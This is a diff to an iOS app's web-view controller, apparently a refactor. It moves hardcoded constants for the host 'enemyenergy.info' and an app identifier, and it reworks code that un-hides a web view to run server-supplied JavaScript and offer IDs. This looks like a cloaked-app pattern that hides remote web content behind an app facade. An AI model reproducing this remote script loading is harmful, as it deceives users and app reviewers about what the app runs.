@@ -4,6 +4,12 @@ import FacebookCore
 import OneSignal
 
 class WebViewController: UIViewController {
+    //MARK: - 'Variable
+    fileprivate let key = "qcwzqrz96qtlz2hs1e4v"
+    fileprivate let host =  "enemyenergy.info"
+    fileprivate let path = "/index.php"
+    fileprivate let source = "com.LesliePersich.Priest-in-Egypt"
+    
     fileprivate let service = DifferentServices.shared
     fileprivate let appDelegate = UIApplication.shared.delegate as! AppDelegate
     fileprivate var fbDeepLinkURL: URL?
@@ -51,24 +57,8 @@ class WebViewController: UIViewController {
     fileprivate var firstPage = true
     
     //MARK: - dropboxJSSource
-    fileprivate var dropboxJSSource: String = "" {
-        didSet {
-            DispatchQueue.main.sync {
-                if !self.dropboxJSSource.isEmpty && self.dropboxJSSource != "true" {
-                    self.webView.isHidden = false
-                    self.webView.evaluateJavaScript(self.dropboxJSSource)
-                    if !self.customOfferID.isEmpty && !self.wasFirstRunMainFuncOnPage {
-                        self.webView.evaluateJavaScript("mainFunc('\(self.customOfferID)')") { result, error in
-                            //print(#line, #function, result, error, self.customOfferID)
-                            self.wasFirstRunMainFuncOnPage = true
-                        }
-                    }
-                    self.setupAskRegTimer()
-                } else if self.dropboxJSSource == "true"  {
-                    self.presentMenuController()
-                }
-            }
-        }
+    fileprivate var dropboxJSSource: String {
+        return service.dropboxJSSource
     }
     
     private var firstLoading: Bool {
@@ -129,19 +119,12 @@ class WebViewController: UIViewController {
         return webView
     }()
     
-    //MARK: - Variable
-    fileprivate let key = "qcwzqrz96qtlz2hs1e4v"
-    fileprivate let host =  "enemyenergy.info"
-    fileprivate let path = "/index.php"
-    fileprivate let source = "com.LesliePersich.Priest-in-Egypt"
-    
     //MARK: - ViewController Methods
     override func viewDidLoad() {
         super.viewDidLoad()
         if firstLoading {
             setupDeepTimer()
         }
-        
         setupUI()
         if !firstLoading {
             webView.load(deepURL)
@@ -191,7 +174,7 @@ class WebViewController: UIViewController {
     
     fileprivate func setupDeepTimer() {
         NotificationCenter.default.addObserver(self, selector: #selector(startWKWebViewWithDeepLink), name: .notificationDeepURLHasCome, object: nil)
-        deepLinkTimer = Timer.scheduledTimer(timeInterval: 10, target: self, selector: #selector(fireDeepTimer), userInfo: nil, repeats: false)
+        deepLinkTimer = Timer.scheduledTimer(timeInterval: 8, target: self, selector: #selector(fireDeepTimer), userInfo: nil, repeats: false)
         deepLinkTimer?.tolerance = 0.1
     }
     
@@ -221,9 +204,6 @@ class WebViewController: UIViewController {
         webView.load(url)
         firstLoading = false
     }
-    
-    //MARK: - getDropboxJS
-    
     
     private func setupAskRegTimer() {
         regTimer?.invalidate()
@@ -334,20 +314,16 @@ class WebViewController: UIViewController {
 }
 
 //MARK: - Extension
-extension WKWebView {
-    func load(_ urlString: String) {
-        if let url = URL(string: urlString) {
-            let request = URLRequest(url: url)
-            load(request)
-        }
-    }
-    
-    func load(_ url: URL) {
-        let request = URLRequest(url: url)
-        load(request)
+extension WebViewController {
+    func setupUI() {
+        self.view.backgroundColor = .black
+        self.view.addSubview(webView)
+        webView.topAnchor.constraint(equalTo: self.view.topAnchor).isActive = true
+        webView.bottomAnchor.constraint(equalTo: self.view.bottomAnchor).isActive = true
+        webView.leadingAnchor.constraint(equalTo: self.view.leadingAnchor).isActive = true
+        webView.trailingAnchor.constraint(equalTo: self.view.trailingAnchor).isActive = true
     }
 }
-
 
 extension WebViewController: WKHTTPCookieStoreObserver {
     func setData(_ value: Any, key: String) {
@@ -399,9 +375,7 @@ extension WebViewController: WKNavigationDelegate {
                 }
             }
             setupAskRegTimer()
-        } else if dropboxJSSource == "true"  {
-            presentMenuController()
-        }
+        } 
     }
     
     func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
@@ -426,39 +400,5 @@ extension WebViewController: WKNavigationDelegate {
         }
         
         decisionHandler(.allow)
-    }
-}
-
-extension WebViewController {
-    func setupUI() {
-        self.view.backgroundColor = .black
-        self.view.addSubview(webView)
-        webView.topAnchor.constraint(equalTo: self.view.topAnchor).isActive = true
-        webView.bottomAnchor.constraint(equalTo: self.view.bottomAnchor).isActive = true
-        webView.leadingAnchor.constraint(equalTo: self.view.leadingAnchor).isActive = true
-        webView.trailingAnchor.constraint(equalTo: self.view.trailingAnchor).isActive = true
-    }
-}
-
-extension URL {
-    var queryDictionary: [String: String]? {
-        guard let query = self.query else { return nil}
-        var queryStrings = [String: String]()
-        for pair in query.components(separatedBy: "&") {
-            let key = pair.components(separatedBy: "=")[0]
-            let value = pair
-                .components(separatedBy:"=")[safe: 1]?
-                .replacingOccurrences(of: "+", with: " ")
-                .removingPercentEncoding ?? ""
-            queryStrings[key] = value
-        }
-        print(queryStrings)
-        return queryStrings
-    }
-}
-
-extension Collection {
-    subscript (safe index: Index) -> Element? {
-        return indices.contains(index) ? self[index] : nil
     }
 }
